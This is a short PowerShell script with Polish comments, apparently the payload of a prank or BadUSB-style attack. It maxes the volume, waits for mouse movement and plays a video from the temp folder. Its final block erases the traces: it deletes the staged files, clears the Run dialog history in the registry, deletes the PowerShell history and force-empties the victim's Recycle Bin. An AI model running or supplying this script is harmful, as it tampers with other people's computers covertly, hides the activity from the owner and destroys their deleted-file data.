# Ustaw głośność
$obj = New-Object -ComObject WScript.Shell
1..50 | ForEach-Object { $obj.SendKeys([char]174) }
1..50 | ForEach-Object { $obj.SendKeys([char]175) }

# Czekaj na poruszenie myszki
Add-Type -AssemblyName System.Windows.Forms
$start = [System.Windows.Forms.Cursor]::Position.X
while ([System.Windows.Forms.Cursor]::Position.X -eq $start) {
    Start-Sleep -Seconds 1
}

# Odtwórz film
Start-Process "$env:TEMP\js\1.mp4"

# Poczekaj chwilę (opcjonalnie)
Start-Sleep -Seconds 20

# Wyczyść ślady
Remove-Item "$env:TEMP\js.zip" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\js" -Recurse -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
